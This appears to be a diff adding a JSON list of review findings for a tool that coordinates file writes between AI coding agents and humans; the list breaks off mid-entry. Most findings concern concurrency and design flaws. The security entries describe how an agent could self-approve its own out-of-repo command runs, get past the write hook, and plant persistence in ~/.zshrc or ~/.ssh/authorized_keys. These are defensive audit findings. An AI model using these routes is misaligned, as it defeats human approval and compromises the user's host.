@@ -1,0 +1,642 @@
+[
+ {
+  "title": "Human-write observation and base_observations freshness are unimplemented; the flagship human-agent shared-tree scenario is unenforced",
+  "severity": "critical",
+  "area": "concept",
+  "evidence": "README.md:49-52 promises a human editing README.md while agents work on docs/ and another agent queues on README.md; README.md:20-21 promises preventing avoidable conflicts before the write; core-concept.md:5-15 frames human-agent collision as the core problem. But docs/current-state-coordination.md:504-507 admits no filesystem watcher, git working-tree observer, or IDE integration ships; state-model.md:461-462 admits no HumanWriteObserved events; human saves fail OPEN by policy (current-state-coordination.md:578). The only HumanWrite/watcher references in production source are the unused ActorType::Watcher variant (stateful-core/src/types.rs:58), the context fixture ContextPackage::blocked_human_write with no production caller (stateful-core/src/context.rs:170-186), and the CREATE TABLE human_observations (stateful-store/src/lib.rs:2243). The hook's /v1/authorize payload carries only action/path/purpose/queue_on_conflict/old_path/new_path and never base_observations (stateful-cli/src/hook.rs:1205-1230); grep for base_observations in stateful-cli/src returns nothing, so the server freshness gate (policy_service.rs:462-507) is skipped entirely when base_observations is empty (policy_service.rs:465-467). reconcile_ack records a row but mutates no blocking state (server lib.rs:811+). The only human-write protection is SKILL.md:22 ('Re-read a file immediately before native edits').",
+  "description": "For the README's flagship story the waiting agent could only be 'queued' if someone held a lease on README.md, but a human editing in an IDE never declares intent, acquires a lease, or is observed: no watcher, no save gate, no mtime/hash check. As shipped the system authorizes the waiting agent's write immediately and silently clobbers the human's uncommitted edit — exactly the conflict class README.md promises to prevent. A human's only obligations are one-time `stateful install`/`enable` and occasional `external-run approve`; when they edit files nothing happens, agents holding leases get no signal, and humans get no signal a file is leased unless they run `stateful current`. Because base_observations is never sent by the hook, even agent writes are not freshness-checked — last-writer-wins applies as if the system were absent. The 'not a file lock manager / not a security boundary' non-goal does not excuse the absence of any human-write detection, because human-agent coordination is presented in the present tense as core value. The docs do mark HumanWriteObserved as unimplemented, but README/core-concept still claim the human+agent shared-tree scenario as solved.",
+  "solution": "Either ship a minimal mechanism or fix the docs. Minimal mechanism: (a) at lease acquire record (mtime, size, FNV/blake3 hash) of each leased file and re-stat/compare at every /v1/authorize, emitting HumanWriteObserved and denying with reconcile-required on mismatch not attributable to the session's own writes (reconcile.ack plumbing already exists: reconcile.rs:9-13, server lib.rs:858); (b) have the PreToolUse hook attach base_observations (hash from the agent's last Read of the target) so stale edits deny with stale_target_observation; (c) optionally a scoped git pre-commit shim that emits HumanWriteObserved only for files under live agent intent/lease (avoids the rejected broad-watcher scope). If kept out of scope: rewrite README.md:49-52 and core-concept human-collision claims into future tense, move all human-coordination language behind an explicit 'unimplemented / V2' marker, and have `stateful current` print 'human edits are not detected in v1'.",
+  "sources": [
+   "viability",
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "No empirical evidence the concept works: the only real benchmark run shows zero benefit at ~31% overhead; all positive deltas are fabricated",
+  "severity": "critical",
+  "area": "concept",
+  "evidence": ".stateful_bench/runs/real-one-compare-20260602.md (on disk): 1 pair, stateful functional 1.000 vs no-state 1.000, delta 0.000, all collision/coordination counts 0 in both modes; the pair is class same_repo_disjoint touching different files (task_a=django/db/migrations/operations/models.py, task_b=django/db/backends/sqlite3/schema.py) so coordination could not help in principle; observer-events.jsonl: stateful pair_finished wall_time_ms=365382 vs no-state 278802 (~31% slower). Synthetic deltas are hardcoded: stateful_success always returns Passed/Passed with scripted coordinated_block/denied_write and no_state_regression always injects uncoordinated_same_file_write_collision (stateful-bench/src/lib.rs:2670-2723); chaos_scripted_agent.py:190-213 returns metadata['expected_document'] for all 15 chaos scenarios; synthetic_harness.py:422-424 labels coordinated_block merely because mode=='stateful'. All artifacts are gitignored (.gitignore ignores .stateful_bench/; git ls-files .stateful_bench empty). Real SWE-bench runs emit only lifecycle events (run_pair_inner, lib.rs:1353-1411; swebench_harness_adapter.py emits metrics:{}), so the only discriminating real metric is functional pass rate. README.md:590-602 describes tooling and cites no numbers.",
+  "description": "The core claim (README.md:20-21 'prevents avoidable conflicts') has zero committed or even locally-stored supporting evidence. The benchmark infra is sophisticated (paired-valid deltas, infra-loss accounting, pair classification by gold-patch overlap at lib.rs:654-668) but has only ever been pointed at one real pair, in the class (same_repo_disjoint) where coordination is irrelevant by construction; in real runs the coordination event taxonomy is structurally zero, so the benchmark as wired cannot detect prevented conflicts, only end-to-end resolution. No doc cites fabricated numbers, but absence of evidence plus measured 31% overhead means cost/benefit is net-negative on the only honest data point.",
+  "solution": "Run the decisive experiment the classifier enables: N exact_file_overlap (and same_directory) pairs, stateful vs no-state, measuring (a) functional pair score, (b) clobber/lost-edit incidents detected from git history of the shared tree (not mode labels), (c) wall-time and token overhead. Commit at least one comparison report and manifest, and state the minimum detectable effect. Make real runs emit real coordination events: have the hook/server append denied_write/coordinated_block events to observer-events.jsonl from actual /v1/authorize decisions so collision_safety_score measures observed behavior instead of being pinned at 1.0.",
+  "sources": [
+   "viability"
+  ]
+ },
+ {
+  "title": "Docs never argue the concept against alternatives (isolation/worktrees/containers, orchestrator decomposition, git merge, OS advisory locks); the residual niche is never named",
+  "severity": "major",
+  "area": "concept",
+  "evidence": "README.md:58-67 asserts branches/worktrees isolate longer work while stateful_core coordinates a shared workspace — assertion, no argument; concurrency-control-spec.md:50-55 lists git branches/worktrees/merge as not-replaced but never says when sharing beats isolating; concurrency-control-spec.md:40-58 rebuts only OT/CRDT. grep across docs/*.md finds no discussion of orchestrator-level task decomposition, container-per-agent, worktree-per-agent, or flock. The benchmark's own pair classes (stateful-bench/src/lib.rs:654-668: exact_file_overlap / same_directory / same_repo_disjoint) implicitly concede only the first class is the concept's home turf; the soft-conflict model treats cross-worktree same-path edits as warn-only (state-model.md:171-182), implicitly conceding isolation handles that case.",
+  "description": "The mainstream multi-agent answer is isolation (one worktree/container/branch per agent, merge at the end, orchestrator decomposing tasks so agents rarely overlap); under isolation git provides conflict detection at merge, and for the disjoint-files common case coordination is pure overhead. The strongest competitors are not OT/CRDT (which the spec rebuts) but: the orchestrator that spawned the agents already knows the partition and can prevent overlap with zero protocol; git merge resolves disjoint-line edits cheaply; OS advisory locks give last-resort mutual exclusion without a server. The shared-tree niche is real but specific: (a) environments too heavy to replicate per agent (build caches, dev servers, DB state), (b) tightly coupled tasks needing each other's uncommitted edits immediately, (c) a human working live in the canonical checkout alongside agents (the strongest differentiator versus isolation, and exactly the unimplemented half). The docs never name these conditions, so the project cannot say who it is for, and design choices (turn-based sessions, 300s leases, no human observation) are not derived from any of them.",
+  "solution": "Add a 'When to use this vs worktrees / Alternatives considered' section to README/core-concept (or extend the concurrency spec's non-goals) covering isolation/worktrees/containers, orchestrator decomposition, merge-based reconciliation, and OS locks; name the three conditions above, explicitly recommend isolation when none hold, position stateful_core as complementary, and let that section drive benchmark scenario selection (exact_file_overlap, independently-prompted sessions, no shared orchestrator). Re-derive defaults from the chosen population (e.g., for heavyweight-shared-env teams the orchestrator integration story matters more than per-session MCP self-declaration).",
+  "sources": [
+   "viability"
+  ]
+ },
+ {
+  "title": "TTL/lease/reservation liveness model is mismatched to turn-based agent cadence; friction likely exceeds prevented conflicts",
+  "severity": "major",
+  "area": "ergonomics",
+  "evidence": "Heartbeats are sent only on PostToolUse (hook.rs:286-298; no other hook event heartbeats); lease TTL is 300s (stateful-store/src/lib.rs:15), so any stretch >5 min without a completed tool call (long reasoning, long build, user pause) expires the lease and the next native edit denies missing_lease (policy_service.rs:316-329). Reservations last 120s (lib.rs:16) and are pull-only: no hook polls /v1/notifications/poll or /v1/resume/next, there is no background task in the server (no tokio::spawn in stateful-server/src), and expiry/promotion happen lazily on unrelated reads (lib.rs:2023-2089). Every native edit requires a prior exact-file intent declare AND lease acquire via separate MCP calls (SKILL.md:15-16; policy_service.rs:246-258,310-322); intent hard cap is 3600s (lib.rs:14); claiming a queued reservation supersedes the session's entire prior intent scope (lib.rs:2497-2501 via policy_service.rs:618-636).",
+  "description": "Codex sessions are prompt-driven: a session denied active_lease_conflict typically ends its turn after reporting the denial, and nothing re-activates it; its reservation is granted later (only when some request triggers the lazy sweep) and expires 120s after that unless the user prompts within the window — so the queue handoff routinely fails for human-paced sessions. Meanwhile friction is front-loaded and certain: a two-MCP-call ritual per edited file, leases that evaporate during long turns, a 3600s intent cap stranding tasks over an hour, and a claim that silently revokes the rest of the session's scope. With contention rare (the benchmark's classification shows disjoint work dominates), expected value is negative under current defaults — matching the lone real run (0 benefit, 31% overhead).",
+  "solution": "Match liveness to runtime: (1) add a background expiry/promotion timer so promotions don't depend on traffic; (2) make reservation TTL adaptive — start the 120s clock at first delivery of reservation_granted, or hold reservations until the waiter's next turn boundary; (3) heartbeat from PreToolUse as well / treat an in-flight authorized write as implicit heartbeat, or heartbeat from a sidecar; (4) collapse declare+lease: have /v1/intent/declare optionally auto-acquire same-session leases for declared scopes, and make claim_intent merge the claimed scope into the existing intent instead of superseding it.",
+  "sources": [
+   "viability"
+  ]
+ },
+ {
+  "title": "Coverage cliff: un-enrolled actors and unrecognized write/exec tools are default-allowed, bypassing the gate the value claims depend on",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "Hook dispatch maps Bash/apply_patch/file_change/Edit/Write and mcp__filesystem__* explicitly and falls through to `_ => Ok(HookOutcome::Allow)` for every other tool name with NO authorization call (hook.rs:406-419, fallthrough at 418); the installed PreToolUse matcher is the regex `Bash|apply_patch|Edit|Write|file_change|mcp__filesystem__.*` (install.rs:801,809), so tools whose names don't match never invoke the hook. Disabled repos and non-git dirs are complete no-ops (hook.rs:150-158). Only Codex hooks are installed (no Claude Code/Cursor/aider adapters). README.md:69-71 claims 'Any tool that writes into a repository can benefit'; current-state-coordination.md:45-51 lists prevented failures (overlapping edits, accidental rollback, hidden contention between agents and humans) that require every writer enrolled.",
+  "description": "Advisory coordination's value is roughly the square of the fraction of writers enrolled: any un-enrolled writer can both clobber and be clobbered. Two coverage gaps combine: (a) the actor dimension — humans, other agent CLIs, editors, scripts, and git ops outside the structured wrappers are invisible (enrollment = Codex sessions in allowlisted repos); (b) the tool dimension — even within an enrolled session, any write/exec-capable tool with an unrecognized name (an alternately-named shell tool, a non-filesystem MCP write server, a future Codex edit tool) is silently Allowed with no /v1/authorize call. Read/search tools should default-allow, but defaulting unknown write/exec tools to Allow is the wrong fail direction for a write-gating layer. This is the quiet non-goal-invalidates-value-claim pattern: 'not a security boundary' is fine, but 'cannot see most writers / silently allows unknown write tools' is a coverage gap.",
+  "solution": "State the participation requirement explicitly in README ('coordination protects enrolled sessions from each other; un-enrolled writers are invisible until human-write observation ships'). Change the default classification: maintain an allowlist of read-only tool names and fail closed (deny-with-guidance or require explicit classification) for any tool that could write or execute, including unrecognized names. Ship a generic pre-write shim/adapter spec so other agent runners can enroll (the HTTP protocol is already runner-agnostic), and add the lease-time mtime/hash snapshot so un-enrolled writes go from invisible to detected-after-the-fact.",
+  "sources": [
+   "viability",
+   "security-trust"
+  ]
+ },
+ {
+  "title": "Hook only engages the wait queue when the blocked session already holds live exact-path intent, narrowing the queue story",
+  "severity": "minor",
+  "area": "concurrency",
+  "evidence": "hook.rs:1154-1184 (hook_authorize_purpose returns Some only when /v1/current shows a live intent item for the exact target path owned by the same session); hook.rs:1206-1214 (queue_on_conflict:true and purpose added to the authorize payload only when that lookup succeeds); server requires a queue purpose to enqueue (policy_service.rs:262-269). README.md:90-91 says 'A conflicting writer is blocked by the active lease and can enter a FIFO wait queue' without this precondition.",
+  "description": "A session whose write hits another session's lease before declaring exact intent on that path receives a flat deny and never enters the FIFO queue — it must notice the denial, declare intent, retry, and only then queue. Combined with reservations expiring before the session's next turn, the queue (the centerpiece of the blocked->waiting->reserved->active story) is engaged only on a narrow happy path in real Codex usage.",
+  "solution": "Allow the hook to enqueue using the session's current intent purpose for any path (or a synthesized 'pending retry of denied write' purpose permitted for queueing only, keeping the no-server-synthesized-purpose rule for intents), or have the deny response carry a one-step 'queue this' affordance (wait_id pre-created in dry-run form) so a single retry both declares intent and queues.",
+  "sources": [
+   "viability"
+  ]
+ },
+ {
+  "title": "No fencing between authorize allow and the actual write: expired-lease holders can resume writing on stale authority",
+  "severity": "critical",
+  "area": "concurrency",
+  "evidence": "hook.rs:1186-1251 (authorize_targets POSTs /v1/authorize per target, returns HookOutcome::Allow; the native tool performs the write afterward, unmediated). PostToolUse only heartbeats (hook.rs:286-298; no write verification). The OCC mitigation is unwired: grep -rn base_observations across stateful-cli/src and stateful-mcp/src returns zero hits, and the freshness gate (policy_service.rs:462-507) is skipped entirely when base_observations is empty (policy_service.rs:466-467). Sandbox writes widen the window: sandbox.rs:185-251 authorizes each target, then run_sandboxed_command (sandbox.rs:348) execs an arbitrarily long command with no duration bound relative to the 300s lease TTL (stateful-store/src/lib.rs:15); heartbeats fire only on PostToolUse so none arrive mid-tool-call. Lease expiry promotes the next waiter who can claim and write (lib.rs:2071-2079; policy_service.rs:637-639). concurrency-control-spec.md:166-178 claims the opposite: 'write boundary: enforced' and 'The active lease id acts as a fencing token: if a lease expires and another actor acquires the resource, the old actor cannot resume writing on stale authority.'",
+  "description": "The write boundary is enforced only at PreToolUse time; the write is performed later by Codex (or by an unbounded sandboxed command) with no lease-identity recheck, no post-write verification, and no OCC observation. Concrete lost-update: session A gets allow at t0, is suspended or runs a long build; at t0+300s A's lease expires; B is promoted, claims, rereads, writes; A resumes and its already-authorized write clobbers B, undetected even retroactively. The docs explicitly promise fencing semantics that do not exist, and the one mechanism designed to approximate them (base_observations) is dead code on every real write path. This is the core value claim (preventing lost updates between concurrent writers in one tree) failing at its narrowest, most important point.",
+  "solution": "Three incremental fixes: (1) wire base_observations into the hook — authorize_targets should hash each existing target (server already implements fnv1a64 comparison) and send observations, converting the silent lost-update into an authorize-time deny when the file changed since the agent's last read; (2) add a PostToolUse verification call (e.g., /v1/authorize/confirm with the lease_id from acquire) that checks the lease was continuously held across the write and on failure emits a conflict event and blocks until reconciliation; (3) for sandbox run, bound command wall time to remaining lease TTL (or re-authorize and refuse to exec when remaining TTL < timeout) and heartbeat from the wrapper while the command runs. Update concurrency-control-spec.md:166-178 to state current reality until then.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "workspace_id is a static config string, not worktree identity: cross-repo false conflicts and host-vs-joiner missed conflicts",
+  "severity": "critical",
+  "area": "concurrency",
+  "evidence": "Docs: state-model.md:189 'workspace_id = hash(machine_id + canonical realpath of git worktree root)'; state-model.md:171-173 hard conflict = same workspace_id + same normalized path; 175-178 cross-workspace same-repo must warn. Code: ensure_server starts the server with ServerStartOptions::default() workspace_id='local' (server_lifecycle.rs:34,81-84); `stateful server start` defaults 'local' (cli lib.rs:190-191) while `stateful server join` defaults 'shared' (lib.rs:198-199); env override mints workspace_id='unknown' (runtime.rs:826). Hooks stamp every authorize/session/lease call with runtime.workspace_id for ALL enabled repos (hook.rs:1223,308,371; session file hook.rs:268). All hard-conflict queries filter ONLY by workspace_id + relative_path and ignore the recorded repo_id/root identity columns (store lib.rs:1113-1135,1165-1191,903-977). No soft-conflict warn path exists in authorize_write (policy_service.rs:138-350 emits only allow/deny).",
+  "description": "Two failure modes, both default. (a) Over-blocking: every repo on one machine shares workspace 'local' in one global state.db, so a lease on Cargo.toml/README.md/src/main.rs in repo A hard-denies and queues an unrelated session writing the same relative path in repo B — false active_lease_conflict denials and bogus FIFO entanglement across projects. (b) Under-blocking: with LAN join, the host's sessions run in 'local' while every joiner's run in 'shared' against the same server/DB, so host and joiner sessions editing the same project never see each other's leases/reservations — the exact conflicts join exists to coordinate are silently missed. A third split occurs whenever STATEFUL_SERVER_URL/TOKEN is set in one context but not another ('unknown' vs 'local').",
+  "solution": "Derive workspace_id at the client boundary per the documented formula: hash(machine_id + canonical realpath of the enabled repo root). repo_registry already canonicalizes roots and computes repo_id (repo_registry.rs:263-268) — reuse it and pass the per-repo workspace_id in the envelope instead of runtime.workspace_id. Drop the --workspace-id knob from start/join (or make it a namespace prefix only). On the server, reject authorize calls whose workspace_id does not match the supplied workspace.root identity, and implement the documented soft-conflict warning for same repo_id + relative_path across workspace_ids.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "Heartbeats extend all leases forever with no intent-coverage check or cap: superseded-intent leases starve FIFO waiters and sustain ABBA deadlock",
+  "severity": "major",
+  "area": "concurrency",
+  "evidence": "refresh_session_state extends EVERY active lease of the session to heartbeat+300s unconditionally — no cap analogous to the intent's declared_at+3600 limit, no check that any active intent still covers the lease path (store lib.rs:2401-2410 vs intents capped at 2438-2456). IntentDeclared materialization supersedes the session's prior intents but never touches leases (lib.rs:2497-2523); claim_intent likewise supersedes the whole prior scope while old leases persist (policy_service.rs:612-639). Other sessions are denied on those zombie leases (policy_service.rs:300-307) and promotion fires only on release/finalize/expiry (lib.rs:1023,1052-1054,2071-2079). PostToolUse fires a heartbeat on every matched tool call (hook.rs:190-219; install.rs:808-813), so a session that keeps using Bash keeps every lease it ever acquired alive — including leases whose justifying intent was superseded (lib.rs:2497-2501) or expired at the 60-minute cap. The only relief valve is the Stop hook calling /v1/activity/finalize (hook.rs:349-361; server lib.rs:674-677).",
+  "description": "The documented model is 'lease = who is actively holding this now' with lease_expiry as a queue-promotion trigger, but in practice a lease's lifetime is the session's lifetime. The prescribed workflow (declare exact intent per file as you move, which replaces scope) accumulates leases on every previously touched file, none of which the session can still write (missing_intent/scope_mismatch for itself) but all of which hard-block every other session and keep their FIFO waiters queued indefinitely. Two sessions each holding a file the other queued on deadlock; the act of waiting (polling via matched tools) generates the heartbeats that sustain the deadlock. The lease_expiry grant trigger promised at state-model.md:312 effectively never fires for live sessions.",
+  "solution": "(1) On IntentDeclared materialization, release (with waiter promotion) all of the session's active leases not covered by the new scope — replace-not-append intent should imply replace-not-append possession. (2) Skip heartbeat refresh for leases lacking a covering active intent so they expire at +300s. (3) Optionally add a hard cap (acquired_at + N minutes) mirroring the intent cap, and surface 'your lease on X is blocking session Y' in the context renderer so agents release voluntarily.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "Cross-process SQLite access with no WAL/busy_timeout/transactions can break mutual exclusion (double active leases) and runs destructive migration against a live server's DB",
+  "severity": "major",
+  "area": "concurrency",
+  "evidence": "ServerConfig holds Arc<Mutex<Store>> over one rusqlite Connection (stateful-server/src/lib.rs:46,50-71,995-1028); Store::open sets zero PRAGMAs — no WAL, no busy_timeout (stateful-store/src/lib.rs:85-98); only Store::append uses a transaction (lib.rs:104-149); acquire_lease is check-then-insert across separate autocommit statements (lib.rs:865-898) with no UNIQUE constraint on active (workspace_id, relative_path, action) — schema lib.rs:2158-2179 has only non-unique indexes. But stateful-cli depends directly on stateful-store (stateful-cli/Cargo.toml:26): `stateful install --yes` and `stateful server join` -> apply_codex_install -> apply_global_install -> Store::open(global state.db) (install.rs:86,125-128; lan.rs:46), whose migrate() runs DELETE/UPDATE legacy purge plus waiter promotions (lib.rs:2334-2367) against a DB a running server may hold; and run_server (foreground) opens the global DB and writes server.json WITHOUT acquiring the start lock (cli lib.rs:873-898), so a manually started second server on another port serves the same DB through a second independent mutex.",
+  "description": "Two writers on one SQLite file with autocommit check-then-act means two acquire_lease calls (one per server process) for the same path can both pass the conflict SELECT and both INSERT an 'active' lease — both sessions then authorized to write the same file, the precise hazard the product exists to prevent. Even benignly, busy_timeout=0 means any cross-process overlap surfaces as immediate SQLITE_BUSY -> HTTP 500 -> hook deny/error, and the install/join purge can release 'legacy' rows and promote waiters out from under the live server's in-memory assumptions. The store's correctness contract (one connection serialized by the server mutex) is violated by the codebase's own CLI in two supported flows; ownership of the DB file is undefined.",
+  "solution": "On open: PRAGMA journal_mode=WAL, busy_timeout (e.g., 5000ms), foreign_keys. Wrap every multi-statement store entry point in a transaction (rusqlite unchecked_transaction works with &self). Add a partial unique index `ON leases(workspace_id, relative_path, action) WHERE status='active'`. Pick one DB owner: route all CLI state access through the HTTP API (install should ask the running server to migrate, or refuse when server.json reports a live pid) and have only the server call Store::open on the global DB; make run_server acquire the start lock and refuse to start when a healthy server.json points elsewhere.",
+  "sources": [
+   "concurrency",
+   "architecture"
+  ]
+ },
+ {
+  "title": "Non-transactional multi-statement transitions strand coordination state on failure; lazy expiration is not 'transactionally equivalent to background expiration'",
+  "severity": "major",
+  "area": "concurrency",
+  "evidence": "claim_intent runs three independent autocommit ops: claim_reservation (store lib.rs:1820-1825), Store::append(IntentDeclared) which supersedes prior intent (policy_service.rs:634-636 -> lib.rs:2497-2501), then acquire_lease (policy_service.rs:637-639). A failure after step 1 (SQLITE_BUSY from a cross-process opener, or the self-conflict clause at lib.rs:957) returns Err AFTER the reservation was consumed (status='claimed' rows no longer block or promote — conflict queries check status='reserved' only, lib.rs:927-936) and possibly after the session's broader intent was destroyed. release_lease updates then promotes in separate statements (lib.rs:994-1023); release_session_leases (1028-1057) and the expire sweep (2027-2089) interleave UPDATE+promote+notification inserts with no enclosing transaction. expire_stale_at flips leases to 'expired' (lib.rs:2071-2076) and only afterwards promotes per freed path (2077-2079); a crash between leaves the lease no longer 'active AND expired<=now' so no later pass re-promotes, stranding waiters permanently. expire_reservation (lib.rs:1830-1839) flips reserved->expired without promoting at all, unlike the sweep (2048-2058). Docs promise the opposite: implementation-contract.md:294-296 'Lazy expiration must be transactionally equivalent to background expiration'; state-model.md:324-325 lease expiry is a grant trigger. Only Store::append is transactional.",
+  "description": "In-process these sequences are serialized by the mutex but are not atomic against process crash, kill -9 during restart (server_lifecycle.rs:272-288 SIGTERMs the server), or mid-sequence errors. Resulting states are not self-describing: a 'claimed' wait row with no lease looks like queue success but the session has no write authority and lost its place; a released/expired lease with an unpromoted waiter delays the queue until unrelated traffic happens to sweep that path — and after a crash-mid-sweep, never. Polling /v1/notifications/poll or /v1/resume/next only runs expire_stale (lib.rs:1856,1775) and never re-promotes already-expired leases; an idempotent re-request by request_id returns the existing queued row without promotion (policy_service.rs:659-682).",
+  "description_extra": "",
+  "solution": "Wrap each logical transition (expire-lease+promote, release+promote, expire-reservation+promote, and PolicyService::claim_intent as a unit) in BEGIN IMMEDIATE...COMMIT (the store already serializes behind the server mutex). Make claim_intent validate acquire_lease preconditions before flipping the reservation, or roll the claim back on downstream failure. Make promotion self-healing: have expire_stale also scan queued waiters whose path currently has no active lease/reservation and promote FIFO, so a missed promotion is repaired by the next read. Delete or fix expire_reservation to promote like the sweep.",
+  "sources": [
+   "concurrency",
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Reservation expiry permanently kills the request_id and drops the waiter to the back of the queue; 120s poll-only notification window makes this routine",
+  "severity": "major",
+  "area": "concurrency",
+  "evidence": "The sweep flips reserved->expired and promotes the NEXT queued waiter (store lib.rs:2048-2058); the expired waiter is never requeued. enqueue_intent_request_with_identity returns the existing row for a request_id regardless of status (lib.rs:1357-1362) and the partial unique index (lib.rs:2325-2328) prevents re-insertion, so retrying with the same request_id — the documented idempotent retry (state-model.md:341-344) — returns the dead 'expired' record forever (request_outcome maps it to a terminal wait, policy_service.rs:788-795). Recovery requires a new request_id, which enqueues at the FIFO tail (rowid order, lib.rs:2596). The reservation_granted notification has the same 120s TTL as the reservation (append_notification uses RESERVATION_TTL_SECONDS, lib.rs:1903,16), is delivered only via client polling (/v1/notifications/poll, server lib.rs:906-941), and there is no background task, so expiry/promotion only run when a request triggers expire_stale (lib.rs:2023-2089). Sessions that finalize never have their queued wait rows cancelled (finalize releases leases at server lib.rs:674-677 but not wait_queue rows; state-model.md:345-347).",
+  "description": "A waiter promoted while its agent is mid-long-tool-call (a build, big test run) has 120 seconds to notice, reread, and claim. Missing the window does not requeue it at its FIFO position or even at the tail — it terminally expires the request, and idempotent retry of the same request_id can never recover. FIFO fairness under retries is violated for exactly the cooperative clients the design assumes, and a chain of dead reservations (e.g., from finalized sessions whose queued entries are never cleaned up) delays each real waiter by a full 120s reservation TTL apiece.",
+  "solution": "(1) On reservation expiry, return the waiter to 'queued' (head or tail, configurable) for a bounded number of attempts before terminal expiry, or at minimum let request_intent treat an 'expired' existing record as re-enqueueable for the same owner. (2) Cancel a session's queued/reserved wait rows in activity_finalize. (3) Decouple notification TTL from reservation TTL (notification should outlive the reservation so the agent learns it expired) and document a required poll cadence < reservation TTL.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "Liveness depends entirely on request traffic: no background expiry/promotion task",
+  "severity": "minor",
+  "area": "concurrency",
+  "evidence": "Expiry and waiter promotion run only inside expire_stale at the top of store operations (store lib.rs:2023-2089 and call sites 844,985,1275,1413,1811,1967); no timer/spawn exists in stateful-server/src (grep for tokio::spawn/thread::spawn/interval returns nothing). state-model.md:312 lists lease_expiry as a grant trigger and v1-hardening-scope-decisions.md defers background expiration as remaining work.",
+  "description": "If the blocking session crashes and the waiting session stops polling (or polls only via channels that don't hit the store), the waiter is never promoted and no notification is ever created — the queue freezes despite the blocker being dead. Today every poll endpoint triggers the sweep, so this is survivable for actively polling clients, but the promotion promise is conditional on traffic in a way no doc states.",
+  "solution": "Add a server-side interval task (every 15-30s) that locks the store and runs expire_stale; this also makes the 120s reservation/notification windows deterministic instead of traffic-dependent.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "timestamp_after silently substitutes now() for unparseable timestamps, converting corrupt rows into TTL extensions",
+  "severity": "minor",
+  "area": "concurrency",
+  "evidence": "stateful-store/src/lib.rs:2805-2808: `let base = parse_timestamp(timestamp).unwrap_or_else(OffsetDateTime::now_utc);`. Used for lease/intent expiry math including the 60-minute cap: refresh_session_state computes max_expires_at = timestamp_after(&declared_at, INTENT_MAX_SECONDS) (lib.rs:2440), so a corrupt declared_at yields now+3600 on every heartbeat — a rolling cap that never expires. parse_timestamp rejects fractional seconds and non-Z offsets (lib.rs:2810-2834), and all expiry ordering is lexicographic string comparison (SQL `expires_at <= ?1` at lib.rs:2031/2053/2074; Rust at 2441-2448), so any row in a non-canonical format breaks ordering silently.",
+  "description": "The failure direction is wrong for a coordination system: garbage timestamps should fail closed (expire immediately or error), not silently extend authority. Combined with cross-process DB openers (other binary versions writing rows), non-canonical timestamps are not hypothetical.",
+  "solution": "Make timestamp_after return Result and treat parse failure as already-expired (or surface StoreError). Add a CHECK or normalization pass in migrate() asserting the canonical fixed-width format.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "Localhost-joined restart fix mutates server.json pid before the kill succeeds, converting a 'joined' runtime into an 'owned' one",
+  "severity": "minor",
+  "area": "concurrency",
+  "evidence": "runtime_for_local_restart (server_lifecycle.rs:174-198, added in commit b47ed49) sets runtime.pid = identity_pid and persists via write_global_runtime_file BEFORE stop_server runs (restart_server :165-172). If stop_server then fails (kill permission, identity flap), server.json is left with pid != 0; the pid==0 protections no longer apply: retire_incompatible_runtime (:248-257) treats an unreachable runtime with pid != 0 as a dead LOCAL server, deletes server.json, and ensure_server spawns a fresh default server (port 43873, new random token, workspace 'local' per :81-84) instead of preserving the joined runtime. Other machines that joined this host's custom port/token then fail closed with no hint. The kill-target validation rests on a ps command-name substring match (pid_matches_current_exe, :480-501), vulnerable to pid reuse in the window between identity fetch and kill.",
+  "description": "The fix is sound for its happy path (localhost check, live identity-pid confirmation, exe-name check), but persisting the pid as a side effect of a restart attempt erases the 'this runtime is joined, never replace it locally' marker the rest of the lifecycle relies on, changing crash semantics for joined-localhost setups from 'preserve and bail' to 'silently replace with a differently-tokened default server'.",
+  "solution": "Pass the resolved pid to stop_server in memory without rewriting server.json (or write it only after the kill is confirmed); alternatively add an explicit `joined: true` field to ServerRuntime so retire/ensure semantics don't key off pid==0.",
+  "sources": [
+   "concurrency"
+  ]
+ },
+ {
+  "title": "Agent can self-approve and execute external-run, defeating the only human-approval gate (arbitrary out-of-repo write / host RCE)",
+  "severity": "critical",
+  "area": "security",
+  "evidence": "hook.rs:553-566 authorize_external_run_bash returns Allow when words[2] is request|approve|run|help; hook.rs:824 enumerates those subcommands; hook.rs:430 routes any command containing 'external-run' there. lib.rs:532-551 ExternalRun::Approve{run:true} calls approve_external_run then immediately run_approved_external_run. external_run.rs:112-135 approve_external_run only stamps approved_at — no TTY/interactive/human check. run_approved_external_run (:137-162) -> run_external_sandboxed_command -> seatbelt_command runs `/bin/sh -c <agent-command>` (sandbox.rs:1247) with the OUT-OF-REPO write targets writable; external_run.rs:252-256 forces targets to resolve outside the repo. README.md:431-450 and external_run.rs:312-324 ('Copy and paste this command in a trusted terminal to approve and run') state a USER approves in a trusted terminal.",
+  "description": "external-run is documented as the human-gated escape hatch for writes outside the repo (the sandbox profiles deliberately cannot write outside the repo). But the PreToolUse Bash gate permits the agent to run `<binary> external-run approve <id> --run` and `<binary> external-run run <id>` itself. So an agent can (1) `external-run request --write-dir <existing-dir-outside-repo> --command '<arbitrary>'` (it can learn $HOME via a read-only sandbox run, targeting ~/.zshrc, ~/.ssh, ~/.cargo/bin), then (2) self-approve and execute. The command runs as `/bin/sh -c` with that out-of-repo path writable, giving persistence/RCE (appending to ~/.zshrc or ~/.ssh/authorized_keys, replacing ~/.cargo/bin/stateful). This breaks the model the docs DO claim (human approval for repo-external writes) and fully bypasses the write-confinement that is the system's actual enforcement value.",
+  "solution": "In authorize_external_run_bash, allow ONLY `external-run request` (and `help`); DENY `approve` and `run` from the Bash hook (those must run in a human terminal not subject to the agent's PreToolUse gate). Defense in depth: have approve/run refuse to execute when invoked from an agent context (e.g., when STATEFUL_SANDBOX_RUN_ACTIVE or a Codex hook env is present) and/or require an out-of-band confirmation token the request prints and the human must paste back, so the executing process proves human intent rather than just file state.",
+  "sources": [
+   "security-trust"
+  ]
+ },
+ {
+  "title": "--fs git mounts the entire repo including .git writable; allowlisted `git remote` can persist .git/config entries that execute on the human's next unsandboxed git command",
+  "severity": "major",
+  "area": "security",
